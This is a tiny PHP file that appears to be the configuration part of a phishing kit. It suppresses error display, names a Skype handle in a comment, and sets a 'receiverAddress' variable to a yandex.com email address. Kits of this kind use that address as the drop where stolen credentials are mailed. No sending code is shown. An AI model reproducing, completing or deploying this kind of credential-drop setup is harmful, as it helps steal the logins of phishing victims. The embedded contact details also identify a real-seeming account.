<?php
/*
skype
Tare_ama
*/
ini_set('display_errors', 0);
$receiverAddress = "Richmond.keytech@yandex.com";


?>